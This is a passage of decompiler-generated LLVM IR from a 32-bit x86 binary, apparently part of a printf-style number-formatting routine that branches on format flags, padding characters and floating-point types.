dec_label_pc_804c1cd:                             ; preds = %dec_label_pc_804c1c8
  %v9_804c1cd = icmp eq i32 %v3_804c164, 3
  %v1_804c1d0 = icmp eq i1 %v9_804c1cd, false
  br i1 %v1_804c1d0, label %dec_label_pc_804c1d9, label %dec_label_pc_804c1d2

dec_label_pc_804c1d2:                             ; preds = %dec_label_pc_804c1cd
  store i32 55, i32* @ebx, align 4
  br label %dec_label_pc_804c1e7

dec_label_pc_804c1d9:                             ; preds = %dec_label_pc_804c1cd
  %v9_804c1de = icmp eq i32 %v3_804c164, 1
  br i1 %v9_804c1de, label %dec_label_pc_804c1ec, label %dec_label_pc_804c1e7

dec_label_pc_804c1e5:                             ; preds = %dec_label_pc_804c1c8
  %v1_804c1e5 = sub nsw i32 0, %v4_804c19b
  store i32 %v1_804c1e5, i32* @esi, align 4
  br label %dec_label_pc_804c1e7

dec_label_pc_804c1e7:                             ; preds = %dec_label_pc_804c1d9, %dec_label_pc_804c1d2, %dec_label_pc_804c1e5
  br label %dec_label_pc_804c1ec

dec_label_pc_804c1ec:                             ; preds = %dec_label_pc_804c1d9, %dec_label_pc_804c1e7
  %storemerge103 = phi i32 [ 11, %dec_label_pc_804c1e7 ], [ 6, %dec_label_pc_804c1d9 ]
  store i32 %storemerge103, i32* @ebp, align 4
  %v1_804c1ec = add i32 %v0_804c164.lcssa, 7
  %v2_804c1ec = inttoptr i32 %v1_804c1ec to i8*
  store i8 32, i8* %v2_804c1ec, align 1
  %v0_804c1f1 = load i32, i32* @esp, align 4
  %v1_804c1f1 = add i32 %v0_804c1f1, 20
  %v2_804c1f1 = inttoptr i32 %v1_804c1f1 to i32*
  %v3_804c1f1 = load i32, i32* %v2_804c1f1, align 4
  %v5_804c1f1 = icmp slt i32 %v3_804c1f1, 0
  %v1_804c1f6 = icmp eq i1 %v5_804c1f1, false
  br i1 %v1_804c1f6, label %dec_label_pc_804c200, label %dec_label_pc_804c1f8

dec_label_pc_804c1f8:                             ; preds = %dec_label_pc_804c1ec
  %v1_804c1f8 = add i32 %v0_804c1f1, 36
  %v2_804c1f8 = inttoptr i32 %v1_804c1f8 to i8*
  %v3_804c1f8 = load i8, i8* %v2_804c1f8, align 1
  %v4_804c1f8 = zext i8 %v3_804c1f8 to i32
  %v5_804c1f8 = load i32, i32* %edx.global-to-local, align 4
  %v6_804c1f8 = and i32 %v5_804c1f8, -256
  %v7_804c1f8 = or i32 %v6_804c1f8, %v4_804c1f8
  store i32 %v7_804c1f8, i32* %edx.global-to-local, align 4
  %v3_804c1fc = add i32 %v0_804c1f1, 7
  %v4_804c1fc = inttoptr i32 %v3_804c1fc to i8*
  store i8 %v3_804c1f8, i8* %v4_804c1fc, align 1
  %v0_804c200.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c200

dec_label_pc_804c200:                             ; preds = %dec_label_pc_804c1ec, %dec_label_pc_804c1f8
  %v1_804c219 = phi i32 [ %v0_804c1f1, %dec_label_pc_804c1ec ], [ %v0_804c200.pre, %dec_label_pc_804c1f8 ]
  %v1_804c200 = add i32 %v1_804c219, 344
  %v2_804c200 = inttoptr i32 %v1_804c200 to i32*
  %v3_804c200 = load i32, i32* %v2_804c200, align 4
  store i32 %v3_804c200, i32* %eax.global-to-local, align 4
  store i32 1024, i32* %edx.global-to-local, align 4
  %v1_804c20c = add i32 %v3_804c164, -1
  %v8_804c20c = icmp eq i32 %v1_804c20c, 0
  store i32 %v1_804c20c, i32* %ecx.global-to-local, align 4
  %v0_804c219.pre = load i32, i32* @edi, align 4
  br i1 %v8_804c20c, label %dec_label_pc_804c219, label %dec_label_pc_804c20f

dec_label_pc_804c20f:                             ; preds = %dec_label_pc_804c200
  %v2_804c20f = mul i32 %v0_804c219.pre, 4
  %v3_804c20f = add i32 %v1_804c219, 52
  %v4_804c20f = add i32 %v3_804c20f, %v2_804c20f
  %v5_804c20f = inttoptr i32 %v4_804c20f to i32*
  %v6_804c20f = load i32, i32* %v5_804c20f, align 4
  %v1_804c213 = and i32 %v6_804c20f, 3840
  store i32 %v1_804c213, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804c219

dec_label_pc_804c219:                             ; preds = %dec_label_pc_804c200, %dec_label_pc_804c20f
  %v2_804c219 = add i32 %v1_804c219, -4
  %v3_804c219 = inttoptr i32 %v2_804c219 to i32*
  store i32 %v0_804c219.pre, i32* %v3_804c219, align 4
  %v0_804c21a = load i32, i32* @esi, align 4
  %v2_804c21a = add i32 %v1_804c219, -8
  %v3_804c21a = inttoptr i32 %v2_804c21a to i32*
  store i32 %v0_804c21a, i32* %v3_804c21a, align 4
  %v0_804c21b = load i32, i32* %eax.global-to-local, align 4
  %v2_804c21b = add i32 %v1_804c219, -12
  %v3_804c21b = inttoptr i32 %v2_804c21b to i32*
  store i32 %v0_804c21b, i32* %v3_804c21b, align 4
  %v0_804c21c = load i32, i32* %edx.global-to-local, align 4
  %v2_804c21c = add i32 %v1_804c219, -16
  %v3_804c21c = inttoptr i32 %v2_804c21c to i32*
  store i32 %v0_804c21c, i32* %v3_804c21c, align 4
  %v0_804c21d = call i32 @function_804fe1c()
  %v0_804c222 = load i32, i32* @ebx, align 4
  %v1_804c222 = load i32, i32* @esp, align 4
  %v2_804c222 = inttoptr i32 %v1_804c222 to i32*
  store i32 %v0_804c222, i32* %v2_804c222, align 4
  %v0_804c225 = load i32, i32* @esi, align 4
  %v1_804c225 = load i32, i32* @esp, align 4
  %v2_804c225 = add i32 %v1_804c225, -4
  %v3_804c225 = inttoptr i32 %v2_804c225 to i32*
  store i32 %v0_804c225, i32* %v3_804c225, align 4
  %v0_804c226 = load i32, i32* @edx, align 4
  %v2_804c226 = add i32 %v1_804c225, -8
  %v3_804c226 = inttoptr i32 %v2_804c226 to i32*
  store i32 %v0_804c226, i32* %v3_804c226, align 4
  %v2_804c227 = add i32 %v1_804c225, -12
  %v3_804c227 = inttoptr i32 %v2_804c227 to i32*
  store i32 %v0_804c21d, i32* %v3_804c227, align 4
  %v1_804c228 = add i32 %v1_804c225, 347
  store i32 %v1_804c228, i32* %eax.global-to-local, align 4
  %v2_804c22f = add i32 %v1_804c225, -16
  %v3_804c22f = inttoptr i32 %v2_804c22f to i32*
  store i32 %v1_804c228, i32* %v3_804c22f, align 4
  %v0_804c230 = load i32, i32* %stack_var_-364, align 4
  %v5_804c230 = inttoptr i32 %v0_804c230 to i8*
  %v6_804c230 = call i32 @function_804feb4(i8* %v5_804c230, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804c230, i32* %eax.global-to-local, align 4
  %v0_804c235 = load i32, i32* @esp, align 4
  %v1_804c235 = add i32 %v0_804c235, 32
  store i32 %v6_804c230, i32* @edi, align 4
  %v1_804c23a = add i32 %v0_804c235, 80
  %v2_804c23a = inttoptr i32 %v1_804c23a to i32*
  %v3_804c23a = load i32, i32* %v2_804c23a, align 4
  %tmp93 = icmp ult i32 %v3_804c23a, 6
  br i1 %tmp93, label %dec_label_pc_804c268, label %dec_label_pc_804c241

dec_label_pc_804c241:                             ; preds = %dec_label_pc_804c219
  %v1_804c241 = inttoptr i32 %v6_804c230 to i8*
  %v2_804c241 = load i8, i8* %v1_804c241, align 1
  %v11_804c241 = icmp eq i8 %v2_804c241, 45
  %v1_804c244 = icmp eq i1 %v11_804c241, false
  %v1_804c253 = add i32 %v0_804c235, 64
  %v2_804c253 = inttoptr i32 %v1_804c253 to i32*
  %v3_804c253 = load i32, i32* %v2_804c253, align 4
  br i1 %v1_804c244, label %dec_label_pc_804c253, label %dec_label_pc_804c246

dec_label_pc_804c246:                             ; preds = %dec_label_pc_804c241
  %v4_804c246 = or i32 %v3_804c253, 2
  store i32 %v4_804c246, i32* %v2_804c253, align 4
  %v0_804c24b = load i32, i32* @edi, align 4
  %v1_804c24b = add i32 %v0_804c24b, 1
  store i32 %v1_804c24b, i32* @edi, align 4
  store i32 2, i32* @ebp, align 4
  %v0_804c268.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c268

dec_label_pc_804c253:                             ; preds = %dec_label_pc_804c241
  store i32 %v3_804c253, i32* %eax.global-to-local, align 4
  %v2_804c257 = and i32 %v3_804c253, 2
  %v3_804c257 = icmp eq i32 %v2_804c257, 0
  br i1 %v3_804c257, label %dec_label_pc_804c25f, label %dec_label_pc_804c25b

dec_label_pc_804c25b:                             ; preds = %dec_label_pc_804c253
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804c268

dec_label_pc_804c25f:                             ; preds = %dec_label_pc_804c253
  %v2_804c25f = urem i32 %v3_804c253, 2
  %v3_804c25f = icmp eq i32 %v2_804c25f, 0
  br i1 %v3_804c25f, label %dec_label_pc_804c268, label %dec_label_pc_804c263

dec_label_pc_804c263:                             ; preds = %dec_label_pc_804c25f
  store i32 4, i32* @ebp, align 4
  br label %dec_label_pc_804c268

dec_label_pc_804c268:                             ; preds = %dec_label_pc_804c25f, %dec_label_pc_804c219, %dec_label_pc_804c25b, %dec_label_pc_804c246, %dec_label_pc_804c263
  %v0_804c2bb = phi i32 [ %v6_804c230, %dec_label_pc_804c25f ], [ %v6_804c230, %dec_label_pc_804c219 ], [ %v6_804c230, %dec_label_pc_804c25b ], [ %v1_804c24b, %dec_label_pc_804c246 ], [ %v6_804c230, %dec_label_pc_804c263 ]
  %v0_804c2ca = phi i32 [ %v1_804c235, %dec_label_pc_804c25f ], [ %v1_804c235, %dec_label_pc_804c219 ], [ %v1_804c235, %dec_label_pc_804c25b ], [ %v0_804c268.pre, %dec_label_pc_804c246 ], [ %v1_804c235, %dec_label_pc_804c263 ]
  %v1_804c268 = add i32 %v0_804c2ca, 204
  store i32 %v1_804c268, i32* %ecx.global-to-local, align 4
  %v1_804c26f = add i32 %v0_804c2ca, 20
  %v2_804c26f = inttoptr i32 %v1_804c26f to i32*
  %v3_804c26f = load i32, i32* %v2_804c26f, align 4
  store i32 %v3_804c26f, i32* %edx.global-to-local, align 4
  %v2_804c273 = sub i32 %v1_804c268, %v0_804c2bb
  store i32 %v2_804c273, i32* %ecx.global-to-local, align 4
  %v2_804c275 = icmp slt i32 %v3_804c26f, 0
  %v1_804c277 = add i32 %v2_804c273, 127
  store i32 %v1_804c277, i32* @esi, align 4
  %v1_804c27a = icmp eq i1 %v2_804c275, false
  br i1 %v1_804c27a, label %dec_label_pc_804c281, label %dec_label_pc_804c27c

dec_label_pc_804c27c:                             ; preds = %dec_label_pc_804c268
  store i32 1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804c281

dec_label_pc_804c281:                             ; preds = %dec_label_pc_804c268, %dec_label_pc_804c27c
  %v0_804c2a7 = phi i32 [ %v3_804c26f, %dec_label_pc_804c268 ], [ 1, %dec_label_pc_804c27c ]
  %v1_804c281 = add i32 %v0_804c2ca, 32
  %v2_804c281 = inttoptr i32 %v1_804c281 to i8*
  %v3_804c281 = load i8, i8* %v2_804c281, align 1
  %v4_804c281 = and i8 %v3_804c281, 16
  %v5_804c281 = icmp eq i8 %v4_804c281, 0
  br i1 %v5_804c281, label %dec_label_pc_804c2bb, label %dec_label_pc_804c288

dec_label_pc_804c288:                             ; preds = %dec_label_pc_804c281
  %v1_804c288 = add i32 %v0_804c2ca, 48
  %v2_804c288 = inttoptr i32 %v1_804c288 to i32*
  %v3_804c288 = load i32, i32* %v2_804c288, align 4
  store i32 %v3_804c288, i32* %eax.global-to-local, align 4
  %tmp94 = icmp ult i32 %v3_804c288, 3
  br i1 %tmp94, label %dec_label_pc_804c2a2.thread, label %dec_label_pc_804c296

dec_label_pc_804c2a2.thread:                      ; preds = %dec_label_pc_804c288
  store i32 6, i32* @ebp, align 4
  br label %dec_label_pc_804c2bb

dec_label_pc_804c296:                             ; preds = %dec_label_pc_804c288
  %v9_804c296 = icmp eq i32 %v3_804c288, 3
  %v1_804c299 = icmp eq i1 %v9_804c296, false
  br i1 %v1_804c299, label %dec_label_pc_804c2a2, label %dec_label_pc_804c29b

dec_label_pc_804c29b:                             ; preds = %dec_label_pc_804c296
  store i32 9, i32* @ebp, align 4
  br label %dec_label_pc_804c2bb

dec_label_pc_804c2a2:                             ; preds = %dec_label_pc_804c296
  %v9_804c2a2 = icmp eq i32 %v3_804c288, 4
  %v1_804c2a5 = icmp eq i1 %v9_804c2a2, false
  br i1 %v1_804c2a5, label %dec_label_pc_804c2bb, label %dec_label_pc_804c2a7

dec_label_pc_804c2a7:                             ; preds = %dec_label_pc_804c2a2
  %tmp95 = icmp ugt i32 %v0_804c2a7, %v1_804c277
  br i1 %tmp95, label %dec_label_pc_804c2bb, label %dec_label_pc_804c2ab

dec_label_pc_804c2ab:                             ; preds = %dec_label_pc_804c2a7
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_804c2b0 = inttoptr i32 %v0_804c2bb to i8*
  %v2_804c2b0 = load i8, i8* %v1_804c2b0, align 1
  %v8_804c2b0 = icmp eq i8 %v2_804c2b0, 48
  br i1 %v8_804c2b0, label %dec_label_pc_804c2bb, label %dec_label_pc_804c2b5

dec_label_pc_804c2b5:                             ; preds = %dec_label_pc_804c2ab
  %v1_804c2b5 = add i32 %v2_804c273, 128
  store i32 %v1_804c2b5, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804c2bb

dec_label_pc_804c2bb:                             ; preds = %dec_label_pc_804c2a2.thread, %dec_label_pc_804c2a7, %dec_label_pc_804c2ab, %dec_label_pc_804c2a2, %dec_label_pc_804c281, %dec_label_pc_804c29b, %dec_label_pc_804c2b5
  %v0_804c2f3 = phi i32 [ %v0_804c2a7, %dec_label_pc_804c2a7 ], [ 1, %dec_label_pc_804c2ab ], [ %v0_804c2a7, %dec_label_pc_804c2a2 ], [ %v0_804c2a7, %dec_label_pc_804c281 ], [ %v0_804c2a7, %dec_label_pc_804c29b ], [ %v1_804c2b5, %dec_label_pc_804c2b5 ], [ %v0_804c2a7, %dec_label_pc_804c2a2.thread ]
  %v1_804c2bb = inttoptr i32 %v0_804c2bb to i8*
  %v2_804c2bb = load i8, i8* %v1_804c2bb, align 1
  %v8_804c2bb = icmp eq i8 %v2_804c2bb, 48
  %v1_804c2be = icmp eq i1 %v8_804c2bb, false
  br i1 %v1_804c2be, label %dec_label_pc_804c2eb, label %dec_label_pc_804c2c0

dec_label_pc_804c2c0:                             ; preds = %dec_label_pc_804c2bb
  %v0_804c2c0 = load i32, i32* @ebp, align 4
  %v7_804c2c3 = icmp sgt i32 %v0_804c2c0, 5
  br i1 %v7_804c2c3, label %dec_label_pc_804c2c5, label %dec_label_pc_804c2ca

dec_label_pc_804c2c5:                             ; preds = %dec_label_pc_804c2c0
  store i32 11, i32* @ebp, align 4
  br label %dec_label_pc_804c2ca

dec_label_pc_804c2ca:                             ; preds = %dec_label_pc_804c2c0, %dec_label_pc_804c2c5
  %v1_804c2ca = add i32 %v0_804c2ca, 48
  %v2_804c2ca = inttoptr i32 %v1_804c2ca to i32*
  %v3_804c2ca = load i32, i32* %v2_804c2ca, align 4
  %v12_804c2ca = icmp eq i32 %v3_804c2ca, 1
  %v1_804c2cf = icmp eq i1 %v12_804c2ca, false
  br i1 %v1_804c2cf, label %dec_label_pc_804c2e0, label %dec_label_pc_804c2d1

dec_label_pc_804c2d1:                             ; preds = %dec_label_pc_804c2ca
  store i32 ptrtoint ([6 x i8]* @global_var_80536c4.120 to i32), i32* @edi, align 4
  store i32 5, i32* @esi, align 4
  br label %dec_label_pc_804c45c

dec_label_pc_804c2e0:                             ; preds = %dec_label_pc_804c2ca
  %v1_804c2e0 = icmp eq i32 %v0_804c2f3, 0
  %v1_804c2e2 = icmp eq i1 %v1_804c2e0, false
  br i1 %v1_804c2e2, label %dec_label_pc_804c2eb, label %dec_label_pc_804c2e4

dec_label_pc_804c2e4:                             ; preds = %dec_label_pc_804c2e0
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804c45c

dec_label_pc_804c2eb:                             ; preds = %dec_label_pc_804c2e0, %dec_label_pc_804c2bb
  %v2_804c2eb = sub i32 %v0_804c2f3, %v1_804c277
  %v7_804c2eb = icmp ult i32 %v0_804c2f3, %v1_804c277
  %v12_804c2eb = icmp eq i32 %v2_804c2eb, 0
  %v2_804c2ed = or i1 %v7_804c2eb, %v12_804c2eb
  br i1 %v2_804c2ed, label %dec_label_pc_804c45c, label %dec_label_pc_804c2f3

dec_label_pc_804c2f3:                             ; preds = %dec_label_pc_804c2eb
  store i32 %v2_804c2eb, i32* @ebx, align 4
  br label %dec_label_pc_804c476

dec_label_pc_804c2fc:                             ; preds = %dec_label_pc_804c192
  %tmp96 = icmp ult i32 %v3_804c164, 16
  br i1 %tmp96, label %dec_label_pc_804c301, label %dec_label_pc_804c346

dec_label_pc_804c301:                             ; preds = %dec_label_pc_804c2fc
  %v1_804c301 = add i32 %v0_804c164.lcssa, 33
  %v2_804c301 = inttoptr i32 %v1_804c301 to i8*
  %v3_804c301 = load i8, i8* %v2_804c301, align 1
  %v4_804c301 = and i8 %v3_804c301, 8
  %v5_804c301 = icmp eq i8 %v4_804c301, 0
  %v1_804c306 = add i32 %v0_804c164.lcssa, 344
  %v2_804c306 = inttoptr i32 %v1_804c306 to i32*
  %v3_804c306 = load i32, i32* %v2_804c306, align 4
  store i32 %v3_804c306, i32* %edx.global-to-local, align 4
  br i1 %v5_804c301, label %dec_label_pc_804c313, label %dec_label_pc_804c30f

dec_label_pc_804c30f:                             ; preds = %dec_label_pc_804c301
  %v1_804c30f = inttoptr i32 %v3_804c306 to x86_fp80*
  %v2_804c30f = load x86_fp80, x86_fp80* %v1_804c30f, align 4
  br label %dec_label_pc_804c315

dec_label_pc_804c313:                             ; preds = %dec_label_pc_804c301
  %v1_804c313 = inttoptr i32 %v3_804c306 to double*
  %v2_804c313 = load double, double* %v1_804c313, align 4
  %v3_804c313 = fpext double %v2_804c313 to x86_fp80
  br label %dec_label_pc_804c315

dec_label_pc_804c315:                             ; preds = %dec_label_pc_804c30f, %dec_label_pc_804c313
  %storemerge3 = phi x86_fp80 [ %v2_804c30f, %dec_label_pc_804c30f ], [ %v3_804c313, %dec_label_pc_804c313 ]
  store x86_fp80 %storemerge3, x86_fp80* %st0.global-to-local, align 4
  %v0_804c315 = load i32, i32* @esi, align 4
  %v2_804c315 = add i32 %v0_804c164.lcssa, -4
  %v3_804c315 = inttoptr i32 %v2_804c315 to i32*
  store i32 %v0_804c315, i32* %v3_804c315, align 4
  %v0_804c316 = load i32, i32* @esi, align 4
  %v2_804c316 = add i32 %v0_804c164.lcssa, -8
  %v3_804c316 = inttoptr i32 %v2_804c316 to i32*
  store i32 %v0_804c316, i32* %v3_804c316, align 4
  %v1_804c317 = add i32 %v0_804c164.lcssa, -12
  %v2_804c317 = inttoptr i32 %v1_804c317 to i32*
  store i32 134528986, i32* %v2_804c317, align 4
  %v1_804c31c = add i32 %v0_804c164.lcssa, 20
  store i32 %v1_804c31c, i32* %eax.global-to-local, align 4
  %v2_804c320 = add i32 %v0_804c164.lcssa, -16
  %v3_804c320 = inttoptr i32 %v2_804c320 to i32*
  store i32 %v1_804c31c, i32* %v3_804c320, align 4
  %v1_804c321 = add i32 %v0_804c164.lcssa, -28
  %v1_804c324 = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_804c324 = inttoptr i32 %v1_804c321 to x86_fp80*
  store x86_fp80 %v1_804c324, x86_fp80* %v3_804c324, align 4
  %v1_804c327 = add i32 %v0_804c164.lcssa, 368
  %v2_804c327 = inttoptr i32 %v1_804c327 to i32*
  %v3_804c327 = load i32, i32* %v2_804c327, align 4
  %v5_804c327 = add i32 %v0_804c164.lcssa, -32
  %v6_804c327 = inttoptr i32 %v5_804c327 to i32*
  store i32 %v3_804c327, i32* %v6_804c327, align 4
  %v0_804c32e = call i32 @function_804ff88()
  store i32 %v0_804c32e, i32* %eax.global-to-local, align 4
  %v0_804c333 = load i32, i32* @esp, align 4
  %v1_804c333 = add i32 %v0_804c333, 32
  %v2_804c336 = icmp slt i32 %v0_804c32e, 0
  br i1 %v2_804c336, label %dec_label_pc_804c5d7, label %dec_label_pc_804c33e

dec_label_pc_804c33e:                             ; preds = %dec_label_pc_804c315
  %v1_804c33e = inttoptr i32 %v1_804c333 to i32*
  %v2_804c33e = load i32, i32* %v1_804c33e, align 4
  %v4_804c33e = add i32 %v2_804c33e, %v0_804c32e
  store i32 %v4_804c33e, i32* %v1_804c33e, align 4
  %v0_804c5c4.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c5c4

dec_label_pc_804c346:                             ; preds = %dec_label_pc_804c2fc
  %tmp97 = or i32 %v3_804c164, 1
  %tmp98 = icmp eq i32 %tmp97, 17
  br i1 %tmp98, label %dec_label_pc_804c34f, label %dec_label_pc_804c3e2

dec_label_pc_804c34f:                             ; preds = %dec_label_pc_804c346
  %v9_804c346 = icmp eq i32 %v3_804c164, 17
  %v1_804c34f = add i32 %v0_804c164.lcssa, 332
  %v2_804c34f = inttoptr i32 %v1_804c34f to i32*
  store i32 0, i32* %v2_804c34f, align 4
  %v0_804c35a = load i32, i32* @esp, align 4
  %v1_804c35a = add i32 %v0_804c35a, 344
  %v2_804c35a = inttoptr i32 %v1_804c35a to i32*
  %v3_804c35a = load i32, i32* %v2_804c35a, align 4
  store i32 %v3_804c35a, i32* %edx.global-to-local, align 4
  %v1_804c361 = icmp eq i1 %v9_804c346, false
  br i1 %v1_804c361, label %dec_label_pc_804c3ad, label %dec_label_pc_804c363

dec_label_pc_804c363:                             ; preds = %dec_label_pc_804c34f
  %v1_804c363 = inttoptr i32 %v3_804c35a to i32*
  %v2_804c363 = load i32, i32* %v1_804c363, align 4
  store i32 %v2_804c363, i32* %eax.global-to-local, align 4
  %v2_804c365 = add i32 %v0_804c35a, 340
  %v3_804c365 = inttoptr i32 %v2_804c365 to i32*
  store i32 %v2_804c363, i32* %v3_804c365, align 4
  %v0_804c36c = load i32, i32* %eax.global-to-local, align 4
  %v1_804c36c = icmp eq i32 %v0_804c36c, 0
  br i1 %v1_804c36c, label %dec_label_pc_804c460, label %dec_label_pc_804c374

dec_label_pc_804c374:                             ; preds = %dec_label_pc_804c363
  %v0_804c374 = load i32, i32* @esp, align 4
  %v1_804c374 = add i32 %v0_804c374, 20
  %v2_804c374 = inttoptr i32 %v1_804c374 to i32*
  %v3_804c374 = load i32, i32* %v2_804c374, align 4
  store i32 %v3_804c374, i32* %eax.global-to-local, align 4
  %v2_804c37b = icmp slt i32 %v3_804c374, 0
  br i1 %v2_804c37b, label %dec_label_pc_804c381, label %dec_label_pc_804c37f

dec_label_pc_804c37f:                             ; preds = %dec_label_pc_804c374
  br label %dec_label_pc_804c381

dec_label_pc_804c381:                             ; preds = %dec_label_pc_804c374, %dec_label_pc_804c37f
  %storemerge102 = phi i32 [ %v3_804c374, %dec_label_pc_804c37f ], [ -1, %dec_label_pc_804c374 ]
  store i32 %storemerge102, i32* %ecx.global-to-local, align 4
  %v1_804c381 = add i32 %v0_804c374, 340
  store i32 %v1_804c381, i32* %edx.global-to-local, align 4
  %v1_804c388 = add i32 %v0_804c374, 332
  store i32 %v1_804c388, i32* %eax.global-to-local, align 4
  %v2_804c38f = add i32 %v0_804c374, -4
  %v3_804c38f = inttoptr i32 %v2_804c38f to i32*
  store i32 %v1_804c388, i32* %v3_804c38f, align 4
  %v0_804c390 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804c390 = add i32 %v0_804c374, -8
  %v3_804c390 = inttoptr i32 %v2_804c390 to i32*
  store i32 %v0_804c390, i32* %v3_804c390, align 4
  %v0_804c391 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c391 = add i32 %v0_804c374, -12
  %v3_804c391 = inttoptr i32 %v2_804c391 to i32*
  store i32 %v0_804c391, i32* %v3_804c391, align 4
  %v0_804c392 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c392 = add i32 %v0_804c374, -16
  %v3_804c392 = inttoptr i32 %v2_804c392 to i32*
  store i32 %v0_804c392, i32* %v3_804c392, align 4
  %v0_804c393 = call i32 @function_804fb30()
  store i32 %v0_804c393, i32* %eax.global-to-local, align 4
  %v0_804c398 = load i32, i32* @esp, align 4
  %v1_804c398 = add i32 %v0_804c398, 16
  store i32 %v0_804c393, i32* @esi, align 4
  %v10_804c39d = icmp eq i32 %v0_804c393, -1
  br i1 %v10_804c39d, label %dec_label_pc_804c5d7, label %dec_label_pc_804c3a6

dec_label_pc_804c3a6:                             ; preds = %dec_label_pc_804c381
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_804c46a

dec_label_pc_804c3ad:                             ; preds = %dec_label_pc_804c34f
  %v0_804c3ad = load i32, i32* @ebx, align 4
  %v2_804c3ad = add i32 %v0_804c35a, -4
  %v3_804c3ad = inttoptr i32 %v2_804c3ad to i32*
  store i32 %v0_804c3ad, i32* %v3_804c3ad, align 4
  %v1_804c3ae = add i32 %v0_804c35a, 332
  store i32 %v1_804c3ae, i32* %eax.global-to-local, align 4
  %v2_804c3b5 = add i32 %v0_804c35a, -8
  %v3_804c3b5 = inttoptr i32 %v2_804c3b5 to i32*
  store i32 %v1_804c3ae, i32* %v3_804c3b5, align 4
  %v0_804c3b6 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c3b6 = inttoptr i32 %v0_804c3b6 to i32*
  %v2_804c3b6 = load i32, i32* %v1_804c3b6, align 4
  %v4_804c3b6 = add i32 %v0_804c35a, -12
  %v5_804c3b6 = inttoptr i32 %v4_804c3b6 to i32*
  store i32 %v2_804c3b6, i32* %v5_804c3b6, align 4
  %v1_804c3b8 = add i32 %v0_804c35a, 204
  store i32 %v1_804c3b8, i32* @ebx, align 4
  %v2_804c3bf = add i32 %v0_804c35a, -16
  %v3_804c3bf = inttoptr i32 %v2_804c3bf to i32*
  store i32 %v1_804c3b8, i32* %v3_804c3bf, align 4
  %v0_804c3c0 = call i32 @function_804faec()
  store i32 %v0_804c3c0, i32* %eax.global-to-local, align 4
  %v0_804c3c5 = load i32, i32* @esp, align 4
  %v1_804c3c5 = add i32 %v0_804c3c5, 16
  store i32 %v0_804c3c0, i32* @esi, align 4
  %v10_804c3ca = icmp eq i32 %v0_804c3c0, -1
  br i1 %v10_804c3ca, label %dec_label_pc_804c5d7, label %dec_label_pc_804c3d3

dec_label_pc_804c3d3:                             ; preds = %dec_label_pc_804c3ad
  %v0_804c3d3 = load i32, i32* @ebx, align 4
  store i32 %v0_804c3d3, i32* @edi, align 4
  %v2_804c3d5 = add i32 %v0_804c3c0, 220
  %v3_804c3d5 = add i32 %v2_804c3d5, %v0_804c3c5
  %v4_804c3d5 = inttoptr i32 %v3_804c3d5 to i8*
  store i8 0, i8* %v4_804c3d5, align 1
  br label %dec_label_pc_804c46a

dec_label_pc_804c3e2:                             ; preds = %dec_label_pc_804c346
  %tmp99 = icmp ult i32 %v3_804c164, 20
  br i1 %tmp99, label %dec_label_pc_804c3e7, label %dec_label_pc_804c432

dec_label_pc_804c3e7:                             ; preds = %dec_label_pc_804c3e2
  %v9_804c3e2 = icmp eq i32 %v3_804c164, 19
  %v1_804c3e7 = add i32 %v0_804c164.lcssa, 344
  %v2_804c3e7 = inttoptr i32 %v1_804c3e7 to i32*
  %v3_804c3e7 = load i32, i32* %v2_804c3e7, align 4
  store i32 %v3_804c3e7, i32* %edx.global-to-local, align 4
  %v1_804c3ee = icmp eq i1 %v9_804c3e2, false
  %v1_804c413 = inttoptr i32 %v3_804c3e7 to i32*
  %v2_804c413 = load i32, i32* %v1_804c413, align 4
  br i1 %v1_804c3ee, label %dec_label_pc_804c413, label %dec_label_pc_804c3f0

dec_label_pc_804c3f0:                             ; preds = %dec_label_pc_804c3e7
  store i32 %v2_804c413, i32* @edi, align 4
  %v1_804c3f2 = icmp eq i32 %v2_804c413, 0
  br i1 %v1_804c3f2, label %dec_label_pc_804c460, label %dec_label_pc_804c3f6

dec_label_pc_804c3f6:                             ; preds = %dec_label_pc_804c3f0, %dec_label_pc_804c43b
  %v1_804c403 = phi i32 [ %v0_804c164.lcssa, %dec_label_pc_804c3f0 ], [ %v1_804c455, %dec_label_pc_804c43b ]
  %v1_804c3f6 = add i32 %v1_804c403, 20
  %v2_804c3f6 = inttoptr i32 %v1_804c3f6 to i32*
  %v3_804c3f6 = load i32, i32* %v2_804c3f6, align 4
  store i32 %v3_804c3f6, i32* %eax.global-to-local, align 4
  %v2_804c3fd = icmp slt i32 %v3_804c3f6, 0
  br i1 %v2_804c3fd, label %dec_label_pc_804c403, label %dec_label_pc_804c401

dec_label_pc_804c401:                             ; preds = %dec_label_pc_804c3f6
  br label %dec_label_pc_804c403

dec_label_pc_804c403:                             ; preds = %dec_label_pc_804c3f6, %dec_label_pc_804c401
  %storemerge = phi i32 [ %v3_804c3f6, %dec_label_pc_804c401 ], [ -1, %dec_label_pc_804c3f6 ]
  store i32 %storemerge, i32* %edx.global-to-local, align 4
  %v2_804c403 = add i32 %v1_804c403, -4
  %v3_804c403 = inttoptr i32 %v2_804c403 to i32*
  store i32 %v3_804c164, i32* %v3_804c403, align 4
  %v2_804c404 = add i32 %v1_804c403, -8
  %v3_804c404 = inttoptr i32 %v2_804c404 to i32*
  store i32 %v3_804c164, i32* %v3_804c404, align 4
  %v0_804c405 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c405 = add i32 %v1_804c403, -12
  %v3_804c405 = inttoptr i32 %v2_804c405 to i32*
  store i32 %v0_804c405, i32* %v3_804c405, align 4
  %v0_804c406 = load i32, i32* @edi, align 4
  %v2_804c406 = add i32 %v1_804c403, -16
  %v3_804c406 = inttoptr i32 %v2_804c406 to i32*
  store i32 %v0_804c406, i32* %v3_804c406, align 4
